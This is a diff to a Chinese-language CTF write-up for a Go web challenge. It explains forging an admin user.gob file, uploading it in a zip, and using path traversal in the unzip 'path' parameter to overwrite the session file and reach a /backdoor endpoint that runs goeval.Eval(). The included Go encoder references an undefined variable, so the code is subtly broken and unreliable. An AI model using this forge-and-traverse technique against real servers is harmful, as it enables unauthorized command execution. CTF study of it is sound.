@@ -33,5 +33,47 @@ go语言
 - GET /backdoor
 	- 解码引用user.gob  在 Power为 admin 时 可以通过 goeval.Eval() 来执行命令
 
->思路：上传压缩文件，解压后覆盖原有user.gob 以此引用 /backdoor来执行命令
+>思路：上传压缩文件，解压后覆盖原有user.gob 以此引用 /backdoor来执行命令，由于在调用的时候有decode的操作，我们生成的文件也需要是对应二进制的才能decode
 
+[Go语言二进制文件的读写操作 (biancheng.net)](http://c.biancheng.net/view/4563.html)
+
+```go
+package main
+
+import (
+    "encoding/gob"
+    "fmt"
+    "os"
+)
+
+type User struct {
+    Path string
+    Name string
+    Power string
+}
+
+func main() {
+    user := User{Name: "ctfer", Path: "/tmp/d7671aa466b2c69f80e4bc0cf4b6b638/", Power: "admin"}
+    file, err := os.Create("./user.gob")
+    if err != nil {
+        fmt.Println("文件创建失败", err.Error())
+        return
+    }
+    defer file.Close()
+
+    encoder := gob.NewEncoder(file)
+    err = encoder.Encode(info)
+    if err != nil {
+        fmt.Println("编码错误", err.Error())
+        return
+    } else {
+        fmt.Println("编码成功")
+    }
+}
+```
+
+解压时path可控，可以直接目录穿越
+path=/../../../../../tmp/d7671aa466b2c69f80e4bc0cf4b6b638/
+带着参数访问unzip就可以
+
+![](attachments/Pasted%20image%2020230427135428.png)
